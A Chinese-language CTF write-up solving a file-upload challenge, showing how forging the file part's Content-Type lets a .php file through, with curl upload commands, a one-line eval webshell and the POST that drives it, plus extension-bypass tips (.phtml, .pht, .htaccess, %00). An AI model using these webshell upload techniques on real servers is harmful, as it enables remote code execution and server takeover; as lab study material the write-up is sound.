## 一、题目长什么样（先建立直觉）

首页只有一张图和一张表单，短得可疑——Burp 历史里 `GET /` 的长度列是 753/754，换算下来约 388 字节响应头 + 368 字节响应体：

```html
<title>up10ad来康康</title>
<form action="upload.php" method="post" enctype="multipart/form-data">
<input type="file" name="uploaded" />
```

响应头给了两条硬信息：`Server: Apache/2.4.7 (Ubuntu)`、`X-Powered-By: PHP/5.5.9-1ubuntu4.14`。这个组合等于在脸上写“我是 upload-labs 的课件环境”，考点一定是「怎么把 `.php` 送进能被解析的目录」。

真正省事的一点：**`/upload/` 开着目录列表**（`Index of /upload`）。文件到底有没有落地、落地成什么名字，不用猜，刷新列表就能自证。这也意味着它是**全局共享目录**——列表里能看到别人传的 `a.gif`、`a.gif.php`。

## 二、思路总览

1. 侦察：读首页表单（字段 `uploaded`、按钮 `submit=GoGoGo!`），确认 `/upload/` 可列目录。
2. 对照实验定位校验点：`.jpg`＋`image/jpeg` 过、`.php`＋`application/octet-stream` 被拒、**`.php`＋`image/jpeg` 过** → 只查 MIME，后缀一点都不看。
3. 传 `<?php phpinfo();?>` 落地成 `/upload/shell.php`，访问即执行。
4. `phpinfo()` 的 **Environment** 表里 `FLAG` 一行直接给答案。
5. 进阶：换一句话木马，`POST d=phpinfo();` 走同一条路（flag 同样在环境变量里，不在 `find /` 能翻到的文件里）。

一句话链路：`Content-Type` 伪造 → `.php` 落地 → 执行 → `phpinfo()` 里翻环境变量。

## 三、逐步复现

### 3.1 第一步：先摸清校验的是什么

逐个变量做对照，只改一个条件。这五条全部是实测记录，不是推测：

| 上传的文件名 | 文件段的 Content-Type | 服务端响应 | 读法 |
|---|---|---|---|
| `shell.jpg` | `image/jpeg` | `./upload/shell.jpg succesfully uploaded!` | 类型在白名单 → 放行 |
| `shell.php` | `application/octet-stream` | `<meta charset="utf-8">想啥呢！` | 浏览器对 `.php` 默认就发这个类型 → 被拦 |
| **`j.php`** | **`image/jpeg`** | **`./upload/j.php succesfully uploaded!`** | **关键：后缀是 `.php` 也照样放行** |
| `.htaccess` | `text/plain` | `想啥呢！` | 换后缀也没用，卡的是类型 |
| `p3.jpg` | `text/plain` | `想啥呢！` | 后缀对、类型假，一样拦 |

第四、五条把“后缀黑名单”这个假设彻底排掉了：`.htaccess` 被拒、`p3.jpg` 被拒，唯一变量是 `Content-Type`。后端逻辑大致是（反推，非源码）：

```php
if (!in_array($_FILES['uploaded']['type'], ['image/jpeg', 'image/png', 'image/gif'])) {
    die('<meta charset="utf-8">想啥呢！');
}
move_uploaded_file($_FILES['uploaded']['tmp_name'], './upload/' . $_FILES['uploaded']['name']);
```

`$_FILES['…']['type']` 是**请求里带上来、客户端自己填的字符串**，服务端没法验证真伪。改一行头就过。

顺带解释题解里那句“上传 jpg 文件，然后修改后缀”：作者本地把文件命名成 `shell.jpg`（浏览器于是自动发 `image/jpeg`，过类型校验），Burp 拦包后把 `filename="shell.jpg"` 改回 `shell.php`。**和直接把 Content-Type 改成 `image/jpeg` 完全等价**，只是改的字段不同。

### 3.2 第二步：上传 payload 并读 flag

```powershell
Set-Content .\shell.php '<?php phpinfo();?>' -NoNewline -Encoding utf8
curl.exe -s -X POST "http://node7.anna.nssctf.cn:27076/upload.php" -F "uploaded=@shell.php;type=image/jpeg" -F "submit=GoGoGo!"
```

返回：

```
<meta charset="utf-8">./upload/shell.php succesfully uploaded!
```

`curl -F "uploaded=@shell.php;type=image/jpeg"` 里的 `;type=` 就是**只给这一段**写 `Content-Type`，等价于 Burp 里手改文件段那一行，不用动请求头里的 `multipart/form-data; boundary=…`。

然后访问并筛：

```powershell
curl.exe -s "http://node7.anna.nssctf.cn:27076/upload/shell.php" | Select-String 'NSSCTF'
```

页面有 78,753 字节（就是留档的 `phpinfo.html`），`phpinfo()` 的 **Environment** 区块里：

```
HOSTNAME         anna907b81c83e_sservice
APACHE_RUN_USER  www-data
FLAG             NSSCTF{38ee8558-8ff8-49a3-9569-c1e38f0ca06e}
APACHE_LOG_DIR   /var/log/apache2
```

同一个页面里还能顺手确认几件事：`SCRIPT_FILENAME = /var/www/html/upload/shell.php`（文件确实落在 web 目录）、`SERVER_ADDR = 172.16.0.3`、`HTTP_USER_AGENT = curl/8.21.0`（这份 phpinfo 就是那次 curl 抓的，可回溯）。

### 3.3 第三步：一句话木马版（同一题的另一种姿势）

环境重建后端口变成 `:27667`，同一个上传点上传 `<?php @eval($_POST['d']);?>`，文件名写 `aaa.php`、文件段保留 `Content-Type: image/jpeg`，返回：

```
<meta charset="utf-8">./upload/aaa.php succesfully uploaded!
```

浏览器打开 `/upload/aaa.php` 是**空白 + 200**——这不是失败，是一句话木马本身不输出任何东西。要它干活得再发一条 POST（这台的实例上实发验证过）：

```http
POST /upload/aaa.php HTTP/1.1
Host: node7.anna.nssctf.cn:27667
Content-Type: application/x-www-form-urlencoded
Content-Length: 12

d=phpinfo();
```

`d` 是木马里的字段名，`Content-Length: 12` 就是 `d=phpinfo();` 的字节数——写成 15 服务器会一直等剩下的 3 字节，表现为“点了发送没反应”。响应是一大坨 phpinfo，`Ctrl+F` 搜 `NSSCTF{` 即可。

> 用这个实例的 flag 是 `NSSCTF{34374017-1f39-42bb-806b-3e7e77f830f5}`——**同一道题、不同容器，flag 不同**，说明这是按实例下发的动态 flag。见文末说明。

### 3.4 第四步：三种响应字符串才是真相

| 响应体最后一行 | 含义 | 该修哪里 |
|---|---|---|
| `./upload/xxx succesfully uploaded!` | 成功（注意原文少个 `l`） | 继续 |
| `<meta charset="utf-8">想啥呢！` | MIME 没过 | 文件段的 `Content-Type` 是不是 `image/jpeg` |
| `<meta charset="utf-8">什么都不传就想白给f1ag??` | 文件没带上 | `name="uploaded"`、boundary、结尾 `--`、`Content-Length` |

**别用长度和状态码判断**：被拒也是 200，`想啥呢！` 的响应体只有 35 字节；Burp 历史里 `POST /upload.php` 显示 425/426/397，看着像“成功包”，其实全是 `想啥呢！`＋响应头。

### 3.5 第五步：顺手测出的解析矩阵

这台的 `php5.conf` 用 `<FilesMatch ".+\.ph(p[345]?|t|tml)$">`，实测：

| 扩展名 | 是否被当 PHP 执行 |
|---|---|
| `.php` `.php3` `.php4` `.php5` `.phtml` `.pht` | 全部执行（返回 78700+ 字节的 phpinfo 页） |
| `.Php`（大写 P） | 源码直接吐出来（18 字节），`<FilesMatch>` 区分大小写 |

所以以后目标是**加了后缀黑名单**的 upload 题，`.phtml` / `.php5` / `.pht` 是首选备胎。

## 四、关键知识点

| 概念 | 是什么 | 这题为什么用它 | 以后在哪还会遇到 |
|---|---|---|---|
| `$_FILES['x']['type']` | 请求里客户端自填的 MIME 字符串 | 后端把它当白名单 → 改头即过 | 所有 upload-labs Pass-2 类、CMS 上传点 |
| 文件段 vs 请求头 | multipart 里有两个 `Content-Type` | 要改的是文件段那一个，改错位置整个包结构就崩 | 一切手工改包场景 |
| `/upload/` 目录列表 | Apache `Indexes` 开着 | 落地即可自证文件名与大小 | 判断上传是否真的成功 |
| `phpinfo()` 的 Environment 表 | 打印进程环境变量 | 容器把 `FLAG` 放进了环境变量 | 所有“flag 不在文件里”的容器题 |
| 空白 200 | 请求成功、脚本不输出 | 一句话木马访问就是空白，别当失败 | 蚁剑/冰蝎连接前的连通性判断 |
| `Content-Length` | 必须等于真实 body 字节数 | 大一字节服务器就死等，页面无响应 | 所有手工 Repeater 操作 |
| `<FilesMatch>` 大小写 | Apache 的扩展名匹配区分大小写 | `.Php` 会漏源码 | 后缀黑名单绕过 |

## 五、踩坑与陷阱

1. **改了请求头而不是文件段的 `Content-Type`。** 请求里 `Content-Type` 出现两次，把 `multipart/form-data; boundary=…` 改成 `image/jpeg`，multipart 解析直接失败，落到“什么都不传”。改包前先问自己：“我改的是文件段那一行吗？”
2. **一次 `HTTP=000` 不能当成 WAF 结论。** 我在 `:27076` 上连着试 `eval(`／`passthru(`／`$_POST[` 几个 payload 时拿到过空响应（`HTTP=000`、0 字节），当时怀疑是前置层按 webshell 特征丢包；但环境重建后在 `:27667` 上，同样形态的 `<?php @eval($_POST['d']);?>` 上传、执行、`d=phpinfo();` 全部正常。所以那批 000 更像是**写坏的重定向 / 瞬时丢包**，不是稳定规则——别拿它当“这题不能传一句话”的证据。
3. **`/upload/` 是共享目录。** 固定文件名可能被别人覆盖或撞车，传之前带个随机后缀。
4. **访问路径必须带 `/upload/`。** 落地在 `/var/www/html/upload/`，不是 web 根。
5. **PowerShell 里 `curl` 是 `Invoke-WebRequest` 的别名。** 必须写 `curl.exe`，否则 `-F` 参数全报错。
6. **“用 phpinfo 泄露的上传临时目录做落地”在这题不成立。** 留档的 phpinfo 里 `upload_tmp_dir` 是 `no value`、`open_basedir` 也是 `no value`、`upload_max_filesize` 10M；根本不需要借临时目录——`/upload/` 本身就可写可执行。另外 `disable_functions` 只列了 `pcntl_*`，`system`／`exec` 都没禁，想执行命令直接用 `system` 就行。

## 六、赛场 20 分钟行动清单

1. 看响应头：`Server` / `X-Powered-By` 定环境，`/upload/` 试一下有没有目录列表（30 秒）。
2. 传一个 `.jpg` 走一遍正常流程，确认字段名和成功提示长什么样（1 分钟）。
3. 传 `.php` 看是否被拦、拦的话提示是哪一句——这一步决定后面打哪种绕过（2 分钟）。
4. 抓包只改**文件段**的 `Content-Type: image/jpeg`，文件名保持 `.php`（2 分钟）。
5. 落地后先访问一次确认执行（空白 200 也算成功），再决定是 `phpinfo()` 还是 `system('env')`（2 分钟）。
6. flag 一定先搜环境变量：`phpinfo()` 的 Environment 表、或 `system('env')`；文件系统里的 `flag` 文件经常是诱饵（1 分钟）。

> 超过 15 分钟还在跟“上传失败”较劲，就换一种绕过（`.phtml`／`.htaccess`／双写／`%00`）再试，别在原地改同一个包。
